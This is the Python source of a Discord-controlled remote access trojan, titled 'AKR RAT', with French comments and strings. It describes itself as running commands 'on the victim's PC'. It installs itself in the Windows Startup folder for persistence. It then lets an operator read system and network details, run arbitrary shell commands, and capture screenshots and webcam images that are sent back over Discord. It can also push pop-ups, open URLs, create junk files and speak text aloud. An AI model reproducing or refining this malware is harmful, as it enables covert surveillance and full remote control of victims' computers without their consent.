import discord
from discord.ext import commands
import os
import platform
import socket
import tkinter as tk
from tkinter import messagebox
import threading
import pyscreenshot
import cv2
import webbrowser
import random
import string
from gtts import gTTS
import time
import shutil
import sys

intents = discord.Intents().all()
bot = commands.Bot(command_prefix="!", help_command=None, intents=discord.Intents.all())

system_platform = platform.system()
path = os.path.expanduser('~')
login1 = os.getlogin()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
uname_info = platform.uname()

@bot.event
async def on_ready():
    appdata = os.getenv('APPDATA')
    if appdata is None:
        print("La variable d'environnement APPDATA n'a pas été trouvée.")
        return
    startup_folder = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    if not os.path.exists(startup_folder):
        print(f"Le dossier de démarrage n'existe pas : {startup_folder}")
        return
    script_source = sys.argv[0]
    script_name = os.path.basename(script_source)
    script_dest = os.path.join(startup_folder, script_name)
    try:
        shutil.copy(script_source, script_dest)
        print(f"Le fichier {script_name} a été copié dans le dossier de démarrage.")
    except Exception as e:
        print(f"Une erreur est survenue lors de la copie du fichier : {e}")


@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Commandes a executer sur le pc de la victime",
        description="Toute les commandes du RAT :",
        color=discord.Color.blue()
    )
    
    embed.add_field(name="!info", value="Info du PC.", inline=False)
    embed.add_field(name="!message <msg>", value="Pop-up avec le message choisie.", inline=False)
    embed.add_field(name="!cmd <commande>", value="Exec une commande cmd choisie.", inline=False)
    embed.add_field(name="!screen", value="Prend un screenshot.", inline=False)
    embed.add_field(name="!cam", value="Prend une capture de la cam.", inline=False)
    embed.add_field(name="!open_url <url>", value="Ouvre une URL choisie.", inline=False)
    embed.add_field(name="!add_fichier", value="Cree 100 fichier.", inline=False)
    embed.add_field(name="!voice <voix a dire>", value="Dicte une phrase sur le pc de la victime.", inline=False)
    
    await ctx.send(embed=embed)

@bot.command()
async def info(ctx):
    embed = discord.Embed(
        title="Device Info -> " + hostname,
        color=discord.Color.red() 
    )
    embed.add_field(name="📍 IP:", value=ip_address, inline=False)
    embed.add_field(name="🙎 Hostname:", value=hostname, inline=False)
    embed.add_field(name="🎭 Login:", value=login1, inline=False)
    embed.add_field(name="🗿 Home:", value=path, inline=False)
    embed.add_field(name="🛠️ OS:", value=system_platform, inline=False)
    embed.add_field(name="📈 Processor:", value=uname_info.processor, inline=False)
    embed.add_field(name="📉 Version:", value=uname_info.version, inline=False)
    await ctx.send(embed=embed)

def popup(message):
    root = tk.Tk()
    root.withdraw() 
    messagebox.showinfo("AKR RAT", message)
    root.mainloop()

@bot.command()
async def message(ctx, *, msg: str):
    threading.Thread(target=popup, args=(msg,)).start()
    embed1 = discord.Embed(
        title="✅ Message '" + msg + "' envoyer !",
        color=discord.Color.green() 
    )
    await ctx.send(embed=embed1)

@bot.command()
async def cmd(ctx, *, cmd: str):
    os.system(cmd)
    embed2 = discord.Embed(
        title="✅ Command '" + cmd + "' executee !",
        color=discord.Color.green() 
    )
    await ctx.send(embed=embed2)

@bot.command()
async def screen(ctx):
    try:
        screenshot_path = "screenshot.png"
        screenshot = pyscreenshot.grab()
        screenshot.save(screenshot_path)
        
        await ctx.send("✅ Screenshot:", file=discord.File(screenshot_path))
        
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def cam(ctx):
    try:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("❌ Error.")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("❌ Error.")
            return
        image_path = "camera_capture.png"
        cv2.imwrite(image_path, frame)
        cap.release()
        await ctx.send("✅ Camera screen:", file=discord.File(image_path))
        os.remove(image_path)

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def open_url(ctx, *, url: str):
    webbrowser.open(url)
    embed10 = discord.Embed(
        title="✅ URL '" + url + "' ouvert!",
        color=discord.Color.green() 
    )
    await ctx.send(embed=embed10)

def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + ".py"

@bot.command()
async def add_fichier(ctx):
    for i in range(1, 101):
        filename = generate_random_filename()
        
        with open(filename, "w") as file:
            file.write("")  

        await ctx.send(f"✅ {filename} cree.")

@bot.command()
async def voice(ctx, *, voix: str):
    texte = voix
    langue = 'fr'
    tts = gTTS(text=texte, lang=langue)
    tts.save(voix+".mp4")
    time.sleep(1.5)
    os.startfile(voix+".mp4")
    embed456 = discord.Embed(
        title="✅ phrase dictee",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed456)

bot.run('')